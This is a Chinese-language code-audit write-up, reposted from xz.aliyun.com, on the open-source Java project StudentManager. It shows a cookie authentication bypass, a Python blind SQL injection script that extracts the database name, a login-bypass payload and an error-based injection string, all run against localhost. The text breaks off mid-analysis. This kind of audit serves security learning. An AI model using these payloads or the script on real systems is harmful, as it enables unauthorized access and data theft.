---
title: java代码审计之StudentManager
url: https://buaq.net/go-147864.html
source: unSafe.sh - 不安全
date: 2023-02-04
fetch_date: 2025-10-04T05:39:47.956298
---

# java代码审计之StudentManager

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/268f98685f4c17d85503399cf3c346ba.jpg)

java代码审计之StudentManager

https://github.com/Hui4401/StudentManager之前也没审过java的项目，刚学java，就从index.jsp开始一个一个点
*2023-2-3 21:20:23
Author: [xz.aliyun.com(查看原文)](/jump-147864.htm)
阅读量:41
收藏*

---

<https://github.com/Hui4401/StudentManager>

之前也没审过java的项目，刚学java，就从index.jsp开始一个一个点追吧

## 漏洞分析

这里遍历获取到cookie，是否存在name键

## 复现

访问login.jsp,抓包
![](https://cdn.nlark.com/yuque/0/2023/png/12891560/1675408716258-25a6d9bd-fc04-4e11-8a30-c844ea7f32e5.png#averageHue=%23f3f2f2&clientId=u24e45838-35b8-4&from=paste&height=543&id=u6ba8ea3f&name=image.png&originHeight=543&originWidth=1131&originalType=binary&ratio=1&rotation=0&showTitle=false&size=154087&status=done&style=none&taskId=u4b94eda9-fd1f-42d7-8242-9faac6ed5cd&title=&width=1131)
更改路径为index.jsp, cookie中添加存在用户123

```
GET /index.jsp HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: Phpstorm-9e28e970=dbc7cd43-3413-4de5-aa40-3254070809b3; JSESSIONID=0F189B92035E90638972A9FB86734AC0;name=123
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
```

![](https://cdn.nlark.com/yuque/0/2023/png/12891560/1675408790263-92359beb-406a-4b59-be3a-b356d64a9319.png#averageHue=%23f6f4f4&clientId=u24e45838-35b8-4&from=paste&height=354&id=u61c427b8&name=image.png&originHeight=354&originWidth=861&originalType=binary&ratio=1&rotation=0&showTitle=false&size=81115&status=done&style=none&taskId=u9cf2a2f9-076c-4564-a9b1-c9d38eb9b03&title=&width=861)
直接进入后台
![](https://cdn.nlark.com/yuque/0/2023/png/12891560/1675408822294-a9191df3-7b94-48b8-943b-50d6746f142d.png#averageHue=%23c5c4c3&clientId=u24e45838-35b8-4&from=paste&height=757&id=u71deb69f&name=image.png&originHeight=757&originWidth=1137&originalType=binary&ratio=1&rotation=0&showTitle=false&size=176566&status=done&style=none&taskId=ue6c1b3b8-9165-4c1e-b475-3ce42de37a8&title=&width=1137)

## 漏洞分析

这里之前提到了findWithId()函数存在SQL语句拼接，所以name的值直接就可以利用
![](https://cdn.nlark.com/yuque/0/2023/png/12891560/1675409946909-4ecadad7-6fdd-47f1-b8e6-daa361de754e.png#averageHue=%23232525&clientId=u24e45838-35b8-4&from=paste&height=330&id=u72b2e0c3&name=image.png&originHeight=330&originWidth=679&originalType=binary&ratio=1&rotation=0&showTitle=false&size=49088&status=done&style=none&taskId=ud99ea28b-1a60-4678-b153-f328a0e709f&title=&width=679)

## 复现

存在一个盲注，如果语句查询正确就是跳转到one\_page\_student，错误就是跳到login.jsp
![](https://cdn.nlark.com/yuque/0/2023/png/12891560/1675410111288-aea7cab2-cba0-42d6-b221-a0686ecacfce.png#averageHue=%23f7f6f5&clientId=u24e45838-35b8-4&from=paste&height=290&id=u2b24d51d&name=image.png&originHeight=290&originWidth=937&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69010&status=done&style=none&taskId=u0dad7aa9-9cff-4f9c-bed2-a0a530184a0&title=&width=937)

![](https://cdn.nlark.com/yuque/0/2023/png/12891560/1675410197815-26310682-b89f-4b05-9379-32bbb8dbe480.png#averageHue=%23f7f6f5&clientId=u24e45838-35b8-4&from=paste&height=288&id=u8b6e34dc&name=image.png&originHeight=288&originWidth=923&originalType=binary&ratio=1&rotation=0&showTitle=false&size=67985&status=done&style=none&taskId=ued41b04f-e7d2-45a0-abef-5b6bbc37021&title=&width=923)
这里cookie注入还有一点坑点，空格和,号不能用，绕过一下，写了个脚本
成功得到库名

```
import requests
import string

charset = ",@"+ string.digits + string.ascii_lowercase + string.ascii_uppercase + string.printable + string.punctuation

def r(s):
    s = s.replace(" ", "/**/")
    return s

sql = "database()"
result = ""
for i in range(1,100):
    for c in charset:
        cc = ord(c)
        cookie = f'''name=123'/**/and/**/ascii(substring({sql}/**/from/**/{i}))={cc}#'''
        url = "http://localhost:8080/index.jsp"
        proxies = {"http": "http://127.0.0.1:8081"}
        headers = {
        "cookie": cookie}
        r = requests.get(url,allow_redirects=False,headers=headers)
        if "one_page_student" in r.headers.get('Location'):
            result += c
            print(result)
            break
print('over!!!')
```

![](https://cdn.nlark.com/yuque/0/2023/png/12891560/1675410306736-abf00149-e6d7-424e-b955-b786defb234c.png#averageHue=%2364805f&clientId=u24e45838-35b8-4&from=paste&height=709&id=ufe4ba11b&name=image.png&originHeight=709&originWidth=1226&originalType=binary&ratio=1&rotation=0&showTitle=false&size=110110&status=done&style=none&taskId=ub46c23a9-5e5b-43d4-8a2f-8176942ebd9&title=&width=1226)
继续来看login.jsp,先搞搞登录
这里把前端得到的用户密码交给了check\_login去处理![](https://cdn.nlark.com/yuque/0/2023/png/12891560/1675410540772-80ce279e-f0ad-4905-942d-6180e90bd663.png#averageHue=%23343130&clientId=u24e45838-35b8-4&from=paste&height=181&id=ud090a8a3&name=image.png&originHeight=181&originWidth=765&originalType=binary&ratio=1&rotation=0&showTitle=false&size=52719&status=done&style=none&taskId=u1ea15f83-e30c-4ae4-a329-eda9f1a4b4e&title=&width=765)

## 漏洞分析

直接来看check\_login
这里把获取到的用户名密码交给了checkAccount函数
![](https://cdn.nlark.com/yuque/0/2023/png/12891560/1675411108830-dada8262-3b42-4c33-93cc-9e25a55eb7cd.png#averageHue=%232e2c2b&clientId=u24e45838-35b8-4&from=paste&height=302&id=uf9b9864a&name=image.png&originHeight=302&originWidth=574&originalType=binary&ratio=1&rotation=0&showTitle=false&size=53582&status=done&style=none&taskId=ua7583f4c-5771-42a8-828c-d974fc4dcf8&title=&width=574)
跟进看一下
发现是sql语句拼接用户名密码
![](https://cdn.nlark.com/yuque/0/2023/png/12891560/1675411173068-226c0773-9e71-4245-bb73-4216c9bf9116.png#averageHue=%23312f2d&clientId=u24e45838-35b8-4&from=paste&height=176&id=u46521ee4&name=image.png&originHeight=176&originWidth=809&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45146&status=done&style=none&taskId=u322415fd-4a31-488d-9cbc-f6708a537a7&title=&width=809)

## 复现

那可以用万能密码进行登录了

```
123'#
sdsdsfsd
```

直接登录成功
![](https://cdn.nlark.com/yuque/0/2023/png/12891560/1675411426082-a4f8740b-9f85-4951-a479-c4993488743e.png#averageHue=%23c1c0bf&clientId=u24e45838-35b8-4&from=paste&height=663&id=u2215f656&name=image.png&originHeight=663&originWidth=1202&originalType=binary&ratio=1&rotation=0&showTitle=false&size=157144&status=done&style=none&taskId=u41539d04-a301-45e6-94cb-6c333ebcfff&title=&width=1202)
报错注入

```
user=123'/**/and/**/extractvalue(1,concat(0x7e,(select/**/@@version),0x7e))#&password=sdsdsfsd
```

![](https://cdn.nlark.com/yuque/0/2023/png/12891560/1675412073746-19790f4f-c18c-425e-8d0a-e43b723a94a4.png#averageHue=%23f6f2f1&clientId=u24e45838-35b8-4&from=paste&height=562&id=ue9f5d4c5&name=image.png&originHeight=562&originWidth=942&originalType=binary&ratio=1&rotation=0&showTitle=false&size=136258&status=done&style=none&taskId=u138ca3fe-ebe2-44fc-a087-aa7bcd2232f&title=&width=942)
登录看完了来看看注册

## 漏洞分析

这里把数据交给了check\_register处理
![](https://cdn.nlark.com/yuque/0/2023/png/12891560/1675412589133-3e8518ec-1a6d-4436-868f-173bc734d80c.png#averageHue=%23363332&clientId=u24e45838-35b8-4&from=paste&height=205&id=u8f4bec70&name=image.png&originHeight=205&originWidth=793&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69056&status=done&style=none&taskId=ua73124c9-99c9-4da2-9fc0-684b9c612ab&title=&width=793)
这里看到session去获取验证码的值
![](https://cdn.nlark.com/yuque/0/2023/png/12891560/1675413082926-7b6da3c4-fdd3-4f50-904e-73b01bb782ea.png#averageHue=%23322a2a&clientId=u24e45838-35b8-4&from=paste&height=202&id=ue8facb7b&name=image.png&originHeight=202&originWidth=768&originalType=...